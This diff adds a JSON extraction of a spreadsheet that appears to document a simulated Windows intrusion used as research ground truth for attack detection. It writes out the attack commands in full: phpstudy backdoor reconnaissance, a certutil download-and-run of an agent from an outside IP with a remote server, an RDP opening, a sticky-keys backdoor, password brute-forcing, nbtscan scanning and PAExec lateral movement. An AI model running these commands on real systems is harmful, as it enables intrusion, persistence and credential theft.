@@ -1,0 +1,227 @@
+{
+  "file": "/Users/tianxd/Documents/ChatGPT/4/research/repos/nodlink/doc/SimulatedWS12-attack/attack_analysis.xls",
+  "sha256": "394e31cd95f7ff1ab1ea4cae32d1f235169d955cb5f2a14cd63294f3a307850b",
+  "format": "OLE2/BIFF .xls",
+  "sheets": [
+    {
+      "name": "Sheet1",
+      "visibility": 0,
+      "rows": 9,
+      "cols": 4,
+      "nonempty_cells": 26,
+      "merged_ranges_zero_based": [
+        [
+          3,
+          5,
+          0,
+          1
+        ],
+        [
+          3,
+          5,
+          1,
+          2
+        ],
+        [
+          1,
+          2,
+          0,
+          4
+        ]
+      ],
+      "note_count": 0,
+      "hyperlink_count": 0,
+      "cells": [
+        {
+          "coordinate": "A2",
+          "value": "Attack description:\n1. Resource deployment - deploy http server for downloading agent\n2. Detect the phpstudy backdoor vulnerability, detect the existence of the vulnerability, and execute system commands to collect information\n3. Use the vulnerability to launch the agent (simulate online cs)\n4. Use the WinBrute.exe tool to blast the local adminsitrator, and the password is [REDACTED_CREDENTIAL]\n5. Open the 3389 remote connection port and execute the shift backdoor\n6. Use nbtscan.exe to scan intranet port 139\n7. Use the PAExec tool for lateral movement",
+          "redacted": true,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B3",
+          "value": "Attack phase",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C3",
+          "value": "Attack command",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D3",
+          "value": "Attack steps",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "A4",
+          "value": "A1",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B4",
+          "value": "Initialize access",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C4",
+          "value": "whoami&arp -a&ipconfig&ping www.baidu.com -c 1",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D4",
+          "value": "phpstudy backdoor utilization - execution of system commands for information gathering",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C5",
+          "value": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe&cmd /c start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 2f9c7075-ec33-4a29-901a-8e383f395763 -server https://124.223.85.207:8443\"",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D5",
+          "value": "phpstudy backdoor utilization - download the agent and go live",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "A6",
+          "value": "A7",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B6",
+          "value": "Persistence",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C6",
+          "value": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\";REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f ; REG query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D6",
+          "value": "Open the 3389 and leave the shift backdoor",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "A7",
+          "value": "A24",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B7",
+          "value": "Credential theft",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C7",
+          "value": "WinBrute.exe administrator_pass.txt administrator",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D7",
+          "value": "Winbrute blasts the local administrator password",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "A8",
+          "value": "A25",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B8",
+          "value": "Discovery",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C8",
+          "value": "nbtscan.exe 192.168.0.244/24",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D8",
+          "value": "nbtscan scans",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "A9",
+          "value": "A32",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "B9",
+          "value": "Lateral movement",
+          "redacted": false,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "C9",
+          "value": "PAExec.exe \\\\192.168.0.244 -u administrator -p [REDACTED_CREDENTIAL] ipconfig",
+          "redacted": true,
+          "cell_type": 1
+        },
+        {
+          "coordinate": "D9",
+          "value": "PAExec lateral movement",
+          "redacted": false,
+          "cell_type": 1
+        }
+      ]
+    }
+  ],
+  "ole_streams": [
+    {
+      "name": "\u0001CompObj",
+      "bytes": 102
+    },
+    {
+      "name": "\u0005DocumentSummaryInformation",
+      "bytes": 408
+    },
+    {
+      "name": "\u0005SummaryInformation",
+      "bytes": 236
+    },
+    {
+      "name": "ETExtData",
+      "bytes": 682
+    },
+    {
+      "name": "Workbook",
+      "bytes": 18293
+    }
+  ],
+  "biff_selected_record_counts": {
+    "BOF": 2,
+    "BOUNDSHEET": 1,
+    "FORMULA": 0,
+    "NOTE": 0,
+    "OBJ": 0,
+    "MSODRAWING": 0,
+    "MSODRAWINGGROUP": 0,
+    "TXO": 0
+  },
+  "limitation": "ETExtData OLE extension stream was listed but not semantically decoded"
+}
